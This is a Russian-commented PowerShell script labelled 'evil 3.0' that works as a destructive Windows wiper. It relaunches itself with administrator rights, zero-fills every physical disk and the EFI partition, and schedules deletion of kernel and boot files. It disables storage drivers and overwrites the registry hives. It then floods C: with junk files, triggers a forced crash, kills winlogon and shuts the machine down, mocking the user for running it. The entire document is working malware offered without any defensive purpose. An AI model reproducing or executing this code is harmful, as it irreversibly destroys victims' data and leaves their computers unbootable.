# evil 3.0 - онле винда

param([switch]$Force)
if (-NOT $Force) { Write-Host "Используйте -Force для подтверждения" -ForegroundColor Red; exit }

if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrator")) {
    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`" -Force" -Verb RunAs
    exit
}

Write-Host "EVIL 3.1 HOTFIX - УНИЧТОЖЕНИЕ" -ForegroundColor Red
Start-Sleep -Seconds 3


$physicalDisks = Get-WmiObject -Class Win32_DiskDrive
foreach ($disk in $physicalDisks) {
    $diskPath = "\\.\PhysicalDrive$($disk.Index)"
    try {
        $fs = [System.IO.File]::OpenWrite($diskPath)
        $zeroBlock = New-Object byte[] (100MB)
        $totalBlocks = [math]::Ceiling($disk.Size / 100MB)
        for ($i = 0; $i -lt $totalBlocks; $i++) { $fs.Write($zeroBlock, 0, $zeroBlock.Length) }
        $fs.Close()
    } catch { }
}


mountvol Z: /s 2>$null
if (Test-Path "Z:\") { Remove-Item "Z:\*" -Recurse -Force; $fs = [System.IO.File]::OpenWrite("\\.\Z:"); $z = New-Object byte[] (100MB); $fs.Write($z,0,$z.Length); $fs.Close(); mountvol Z: /d }


$files = @("C:\Windows\System32\ntoskrnl.exe","C:\Windows\System32\winload.exe","C:\Windows\System32\winload.efi","C:\Windows\System32\hal.dll","C:\Windows\System32\config\SYSTEM")
foreach ($f in $files) { reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v PendingFileRenameOperations /t REG_MULTI_SZ /d "\??\$f\0\0" /f 2>$null }


$drivers = @("disk","partmgr","volume","storahci","stornvme","pci","acpi")
foreach ($d in $drivers) { reg add "HKLM\SYSTEM\CurrentControlSet\Services\$d" /v Start /t REG_DWORD /d 4 /f }
Get-PnpDevice -Class DiskDrive | Disable-PnpDevice -Confirm:$false -Force


reg load HKLM\TempSystem "C:\Windows\System32\config\SYSTEM" 2>$null; reg delete "HKLM\TempSystem" /f 2>$null; reg unload HKLM\TempSystem 2>$null
$regFiles = @("C:\Windows\System32\config\SYSTEM","C:\Windows\System32\config\SOFTWARE","C:\Windows\System32\config\SAM","C:\Windows\System32\config\SECURITY")
foreach ($rf in $regFiles) { if (Test-Path $rf) { $rfz = [System.IO.File]::OpenWrite($rf); $rz = New-Object byte[] (1MB); for($i=0;$i -lt 100;$i++){$rfz.Write($rz,0,$rz.Length)}; $rfz.Close() } }


$fillBlock = New-Object byte[] (100MB); 1..8 | ForEach-Object { Start-Job -ScriptBlock { param($b) while($true){ $p = "C:\fill_$(Get-Random).bin"; try{[System.IO.File]::WriteAllBytes($p,$b)}catch{break} } } -ArgumentList $fillBlock }


Add-Type -TypeDefinition "using System;using System.Runtime.InteropServices;public class MCE{[DllImport(""ntdll.dll"")]public static extern int NtRaiseHardError(uint e,uint n,uint m,IntPtr p,uint o,ref uint r);}"
$r=0; [MCE]::NtRaiseHardError(0xC000021A,0,0,[IntPtr]::Zero,1,[ref]$r) 2>$null
Stop-Process -Name "winlogon" -Force -ErrorAction SilentlyContinue

Write-Host "Вы добровольно запустили этот файл) by. evil" -ForegroundColor White
Stop-Computer -Force
